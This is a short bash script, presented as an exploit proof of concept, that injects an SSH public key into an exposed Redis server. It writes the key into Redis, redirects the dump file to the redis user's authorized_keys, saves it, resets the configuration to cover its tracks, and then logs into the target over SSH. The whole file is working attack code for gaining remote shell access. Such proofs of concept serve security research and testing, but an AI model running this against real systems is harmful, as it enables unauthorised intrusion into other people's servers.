#!/usr/bin/env bash

#################################################################################
# Author: Nicolas Palumbo                                                       #
# Description: Simple exploit/poc SSH public key injection for redis instances. #
# URL: https://github.com/shaggyz/redis-ssh-injector                            #
# Usage: ./redis-ssh-injector 1.2.3.4                                           #
#################################################################################

if [ ! $# -gt 0 ]; then
    echo "Usage: $0 <host_ip>"
    exit 1
fi

# Remote values, you will need to modify this (sorry script kiddies).
USER="redis"
HOST="$1"
REDIS="redis-cli -h $HOST"
RPATH="/var/lib/redis/.ssh"
RFILE="authorized_keys"
RKEY="chimichurry"

# Create temporary SSL key
if [ ! -f ./id_rsa ]; then
    echo -e "\nCreating a new key pair...\n"
    ssh-keygen -f ./id_rsa -N ""
    echo -e "\n\n"$(cat id_rsa.pub)"\n\n" > id_rsa.pub
    sed -E -i s/[a-zA-Z0-9]+@[a-zA-Z0-9]+/zero@cool.com/g id_rsa.pub
fi

# Default values
DPATH="/tmp"
DFILE="dump.rdb"

echo -e "Current settings:\n"

$REDIS CONFIG GET dir
$REDIS CONFIG GET dbfilename

echo -e "\nCurrent keys:\n"

$REDIS KEYS \*

echo -e "\nLoading public key:\n"

$REDIS -x SET $RKEY < id_rsa.pub
$REDIS KEYS \*
$REDIS GET $RKEY
$REDIS CONFIG SET dir $RPATH
$REDIS CONFIG SET dbfilename $RFILE
$REDIS CONFIG GET dir
$REDIS CONFIG GET dbfilename

echo -e "\nWriting configuration...\n"

$REDIS SAVE

echo -e "\nCleaning up:\n"

$REDIS DEL $RKEY
$REDIS KEYS \*
$REDIS CONFIG SET dir $DPATH
$REDIS CONFIG SET dbfilename $DFILE
$REDIS CONFIG GET dir
$REDIS CONFIG GET dbfilename

echo -e "\nConnecting to the host:\n"

ssh -i id_rsa $USER@$HOST

echo -e "\nRemoving local keys:\n"

rm id_rsa*
